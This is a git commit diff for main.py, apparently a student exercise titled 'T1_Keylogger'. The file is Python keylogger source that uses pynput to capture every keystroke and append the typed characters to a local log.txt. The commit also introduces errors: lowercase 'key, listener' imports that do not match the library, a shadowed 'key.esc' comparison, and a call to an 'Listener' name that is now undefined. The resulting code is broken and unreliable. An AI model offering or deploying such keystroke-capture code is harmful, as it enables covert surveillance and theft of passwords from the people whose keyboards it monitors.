a347dc29d130f3e12622947c8af2f44d64a4bda2
AbdullaAC <AbdullaSulieman2BR@gmail.com>
2022-06-29 08:21:50 +0100

    T1_Keylogger

--- Cyber_Security/Abdulla/T1_KeyLogger/main.py
+++ Cyber_Security/Abdulla/T1_KeyLogger/main.py
@@ -1,40 +1,34 @@
 import pynput
 
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import key, listener
 
-count=0
+count = 0
 keys = []
-
-
-
 
 def on_press(key):
     global keys, count
 
     keys.append(key)
-    count +=1
+    count += 1
     print("{0} pressed".format(key))
 
-    if count >=10:
-        count=1
+    if count >= 10:
+        count = 0
         write_file(keys)
-        keys= []
+        keys = []
 
-                   
 def write_file(keys):
-    with open("log.txt","a") as f:
+    with open("log.txt", "a") as f:
         for key in keys:
-            k= str(key).replace("'","")
+            k = str(key).replace("'", "")
             if k.find("space") > 0:
                 f.write('\n')
             elif k.find("Key") == -1:
                 f.write(k)
-            
-            
 
 def on_release(key):
-    if key == Key.esc:
+    if key == key.esc:
         return False
 
-with Listener(on_press= on_press, on_release= on_release) as listener:
+with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
